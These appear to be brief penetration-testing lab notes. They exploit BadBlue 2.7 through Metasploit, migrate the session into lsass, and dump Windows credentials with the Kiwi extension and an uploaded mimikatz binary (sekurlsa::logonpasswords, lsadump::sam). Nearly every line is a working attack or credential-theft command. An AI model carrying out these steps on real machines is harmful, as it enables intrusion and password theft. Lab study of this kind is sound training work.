* PRACTICAL
* Repeat steps till db_nmap
* As we can see Bad Blue is running on the system which is vulnerable to buffer overflow vulnerability.
* `use exploit/windows/http/badblue_passthru`
* `set target [press tab to get the possible values]` --> In this case BadBlue\ EE\ 2.7\ Universal
* In this meterpreter session:
* We need to change 32-bit meterpreter to 64-bit:
* `pgrep lsass`
* migrate [id revealed form the last command]`

* **Kiwi**
* `load kiwi`
* `help` --> As Kiwi is loaded, this should have Kiwi related commands
* `creds_all` --> Dump all the credentials
* `lsa_dump_sam`
* `lsa_dump_secrets`
* **Transfer mimikatz binary to the target**
* `upload /usr/share/windows-resources/binaries`
* `uplaod /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
* `shell`
* `.\mimikatz.exe`
* Inside mimiktaz:
  * `privilege::debug` --> That should give Privilege '20' OK, if we have appropriate privileges to dump our password.
  * `sekurlsa::logonpasswords` --> That will dump logon passwords
  * `lsadump::sam`
  * Sometimes we might not find any clear text passwords.
